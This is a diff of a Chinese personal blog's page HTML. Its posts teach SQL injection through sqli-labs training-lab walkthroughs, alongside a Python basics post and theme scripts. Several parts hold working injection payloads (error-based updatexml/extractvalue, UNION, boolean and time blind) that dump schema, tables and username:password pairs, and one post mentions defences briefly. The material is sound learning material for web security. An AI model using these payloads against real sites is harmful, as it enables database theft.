-<p>   防御方式：①为网站添加WAF，虽然WAF不能修复SQL注入漏洞，但是可以拦截敏感数  据以防止SQL注入黑客利用。②在服务器端添加过滤代码将可能引发SQL注入的敏感字符过滤或者转义；③使用SQL预编译。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">报错注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-09 20:56:50" itemprop="dateCreated datePublished" datetime="2023-05-09T20:56:50+08:00">2023-05-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-14 10:20:50" itemprop="dateModified" datetime="2023-05-14T10:20:50+08:00">2023-05-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><p>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p>
-<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
-<h2 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h2><p>1.extractvalue()</p>
-<p>2.updataxml()</p>
-<p>3.count() + rand() +floor() +group  by() 导致的主键重复</p>
-<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p>
-<p>第一个参数是xml文档对象名称</p>
-<p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p>
-<pre><code>extractvalue(null,concat(0x7e,(sqli_inject),0x7e))
-
-注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。
-</code></pre>
-<h2 id="UpdateXml函数"><a href="#UpdateXml函数" class="headerlink" title="UpdateXml函数"></a>UpdateXml函数</h2><p>函数用法：</p>
-<p>UPDATEXML(XML_document,XPath_string,new_value)</p>
-<p>三个字符串参数：</p>
-<p>1  .XML_Document是String格式，为XML文档对象的名称</p>
-<p>2   .XPath_string(<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> 格式的字符串)</p>
-<p>3    .new_value,string格式，替换查找到符合条件的数据</p>
-<h3 id="为什么可以用于报错注入："><a href="#为什么可以用于报错注入：" class="headerlink" title="为什么可以用于报错注入："></a>为什么可以用于报错注入：</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码。</p>
-<h2 id="sqli靶场less5"><a href="#sqli靶场less5" class="headerlink" title="sqli靶场less5"></a>sqli靶场less5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p>
-<p>1.判断注入类型</p>
-<p>get 1’ and ’1’ =’1 回显如下：</p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p>
-<pre><code>？id=1’ 
-报错，单引号导致，页面显示数据库的报错信息，确定注入点为单引号字符型
-</code></pre>
-<p>2.判断报错函数是否可用</p>
-<pre><code>？id=0&#39; and updatexml(1,0x7e)--a
-</code></pre>
-<p>页面正常报错，确定报错函数可用</p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p>
-<p>3.脱库</p>
-<p>获取所有的数据库，地址栏输入：</p>
-<pre><code>?id=1&#39; and updatexml(1,
-    substr(
-      concat(0x7e,
-          (select group_concat(schema_name) 
-          from information_schema.schemata)
-       )
-    ,34,31)
-,3) -- a
-</code></pre>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p>
-<p>获取security库中的所有表，地址栏输入：</p>
-<pre><code>
-?id=1&#39; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;))) %23
-</code></pre>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p>
-<p>查user表中的列名</p>
-<pre><code>？id=1&#39; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;)),1)) %23
-</code></pre>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p>
-<p>查字段（双查询注入）</p>
-<pre><code>1&#39; union select 1, count(*), concat((select concat(username,&#39;:&#39;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23
-</code></pre>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p>
-<p>将0改为1,2,3,4……..</p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p>
-<p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-07 10:17:36" itemprop="dateCreated datePublished" datetime="2023-05-07T10:17:36+08:00">2023-05-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-07-11 23:05:31" itemprop="dateModified" datetime="2023-07-11T23:05:31+08:00">2023-07-11</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p>SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。</p>
-<p>php代码举例：</p>
-<pre><code>$query = &quot;select * from users where id = $_GET[&#39;id&#39;];
-</code></pre>
-<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>sql注入漏洞的产生需要满足以下两个条件：</p>
-<p>1.参数用户可控：前端传给后端的参数内容是用户可以控制的；</p>
-<p>2.参数传入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。</p>
-<p>当传入的id参数为 1’ 时，</p>
-<pre><code>select * from users where id=1&#39;
-</code></pre>
-<p>这不符合数据库语法的规范，所以会报错。</p>
-<p>当传入的id参数为and 1=1 时，</p>
-<pre><code>select * from users where id= 1 and 1 = 1
-</code></pre>
-<p>因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，</p>
-<p>当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id =1不同的结果。</p>
-<h2 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h2><p>1.在不知道任何条件时，</p>
-<pre><code>select 要查询的字段名 from 库名.表名
-</code></pre>
-<p>2.在知道一条已知条件时，</p>
-<pre><code>select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;
-</code></pre>
-<p>3.在知道两条已知条件时，</p>
-<pre><code>select 要查询的字段名 from 库名.表名 where 已知条件1的字段名 = &#39;已知条件1的值&#39; and 已知条件2的字段名=&#39;已知条件2的值&#39;
-</code></pre>
-<h2 id="limit用法"><a href="#limit用法" class="headerlink" title="limit用法"></a>limit用法</h2><p>limit的使用格式为limit m ,n, 其中m是记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。</p>
-<p>eg：limit 0,1表示从第一条记录开始，去一条记录。</p>
-<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>mysql中常见的注释符： #或  –空格  或  /**/</p>
-<h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code>内联注释的形式：/*!code*/
-</code></pre>
-<p>内联注释可以用于整个sql语句</p>
-<pre><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
-</code></pre>
-<p>?加参数  &amp;连接参数</p>
-<h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p>1.按照提交的数据类型有：数字型、字符型和搜索型</p>
-<p>2.按照提交方式有：GET注入、POST注入、cookie注入、http头注入等</p>
-<p>3.按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入</p>
-<h2 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h2><p>1.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">我的第一篇博客</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-05-06 20:26:57" itemprop="dateCreated datePublished" datetime="2023-05-06T20:26:57+08:00">2023-05-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-07 10:18:53" itemprop="dateModified" datetime="2023-05-07T10:18:53+08:00">2023-05-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h1 id="一、数学计算符"><a href="#一、数学计算符" class="headerlink" title="一、数学计算符"></a>一、数学计算符</h1><p>1.+加 -减 *乘 /除 //整除 %余数 **幂指数</p>
-<p>2.变量：python的容器，跟print函数（打印数据类型及函数对象）</p>
-<p>异曲同工：变量可以存放数据类型及函数对象，简短的代码（结果也属于Python中的数据类型）</p>
-<p>使用变量来存放字符串及数值</p>
-<p>存放的过程在Python中叫’赋值’，赋值就是=符号，不是数学中的等于</p>
-<p>Python中的等于是”==”，赋值是”=”，一个’=’叫赋值，两个”==”叫等于</p>
-<p>eg：1.</p>
-<p>a=’小许’  b=3  c=3+4</p>
-<p>print(c)</p>
-<ol>
-<li></li>
-</ol>
-<p>2==2</p>
-<p>true 布尔值就是由条件判断得到的</p>
-<p>变量，帮助我们减少代码的复杂性，增强可读性，不管用户输入什么都不会影响我们提前写好代码</p>
-<h1 id="二、命名"><a href="#二、命名" class="headerlink" title="二、命名"></a>二、命名</h1><p>命名：采用驼峰命名法，字母开头(小写)，下换线结尾</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dokidokiy.github.io/2023/05/06/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="aurora">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dokiy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/06/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-06 00:26:39 / 修改时间：00:25:57" itemprop="dateCreated datePublished" datetime="2023-05-06T00:26:39+08:00">2023-05-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
       }
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Dokiy's Blog"><span class="site-name">Dokiy's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Dokiy's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/14/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" title="布尔盲注和时间盲注">布尔盲注和时间盲注</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-14T02:48:47.000Z" title="发表于 2023-05-14 10:48:47">2023-05-14</time></span></div><div class="content">什么是盲注盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站方法代码的限制或者apache等解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个判断过程称为盲注。
+简单理解就是在前端页面没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的，这个时候我们需要使用页面的正常和不正常显示来进行sql注入。
+盲注的分类布尔盲注
+时间盲注
+利用盲注的前提条件首先页面没有显示位（如果有显示位可以选择union联合查询），并且没有返回sql语句的执行错误信息。
+盲注的优缺点优点：不需要显示位和出错信息。
+缺点：速度慢，耗费时间长（可以使用bp等工具）
+布尔类型的盲注
+left(database(),1)&gt;’s’     //left() 函数
+
+database()显示数据库名称，left(a,b)从左侧截取a的前b位
+
+ ascii(substr((select table_name information_schema.tables where tables_schema=d ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/14/sql-labs%E9%9D%B6%E5%9C%BAless5/" title="sql-labs靶场less6">sql-labs靶场less6</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-14T01:56:33.000Z" title="发表于 2023-05-14 09:56:33">2023-05-14</time></span></div><div class="content">1.判断注入点（双引号注入）
+?id=1&quot; and 1 --a   页面显示正常
+
+
+?id=1&quot; and 0 -- a   页面异常（空显示）
+
+
+2.判断字符长度
+判断当前使用的数据库长度是否大于1
+?id=1&quot; and length(database())=8 --+
+
+
+3.穷举字符
+判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入
+?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a
+
+?id=1&quot; and left(database(),1)=&#39;s&#39; --+
+
+用穷举的方法一个个列出来，....效率有点慢了
+
+
+?id=1&quot; and left(database(),8)=&#39;security&#39; --+
+
+
+4.判断库中每个表名的长度
+?id=1&quot; and length((select table_name from information_schema.tables where table_sc ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless1/" title="sql-labs靶场less4">sql-labs靶场less4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-13T15:43:53.000Z" title="发表于 2023-05-13 23:43:53">2023-05-13</time></span></div><div class="content">在复习一下less4
+less-3是单引号+右括号，less-4是双引号+右括号
+1.判断注入点
+一开始，？id=1 直接回显用户名和密码，
+
+在尝试一下别的符号
+?id=1”  出现报错信息
+
+错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。
+2.查字段名
+输入
+？id=1&#39; and 1=2 --+
+
+后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列
+
+3.查输出列的位置
+xxxxxxxxxx ?id=-1&quot;) union select 1,2,3 --+
+
+
+4.查看当前数据库和版本
+?id=-1&quot;) union select 1,database(),version() --+
+
+
+5.查看当前数据库下的表
+?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_s ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/13/sql-labs%E9%9D%B6%E5%9C%BAless4/" title="sql-labs靶场less4">sql-labs靶场less4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-13T15:43:53.000Z" title="发表于 2023-05-13 23:43:53">2023-05-13</time></span></div><div class="content">在复习一下less4
+less-3是单引号+右括号，less-4是双引号+右括号
+1.判断注入点
+一开始，？id=1 直接回显用户名和密码，
+​              ？id=1’ 也是直接回显用户名和密码
+
+在尝试一下别的符号
+?id=1”  出现报错信息
+
+错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。
+2.查字段名
+输入
+?id=1&quot;) order by 4 --+
+
+后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列
+
+3.查输出列的位置
+?id=-1&quot;) union select 1,2,3 --+
+
+
+4.查看当前数据库和版本
+?id=-1&quot;) union select 1,database(),version() --+
+
+
+5.查看当前数据库下的表
+?id=-1&quot;) union select 1,group_concat(table_name),3 from informatio ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/05/13/%E2%80%99sql-labs%E9%9D%B6%E5%9C%BAless3%E2%80%99/" title="sql-labs靶场less3">sql-labs靶场less3</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-13T12:31:35.000Z" title="发表于 2023-05-13 20:31:35">2023-05-13</time></span></div><div class="content">今天浅浅复习一下
+1.判断注入点，
+输入？id=1 显示正常 
+​     ？id=1’ 不正常  说明存在注入
+
+上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合
+?id=1&#39;) union select 1 --+
+
+
+上面图片显示列数不正确，盲猜试试三列
+2.判断字段数
+?id=1&#39;) union select 1,2,3 --+
+
+
+字段数为4时报错，说明字段数为3
+3.判断回显
+
+4.查看当前数据库和版本
+?id=-1&#39;) union select 1,database(),version() --+
+
+
+5.查看数据库名称
+?id=-1&#39;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+
+
+
+6.查看security库里面的表名
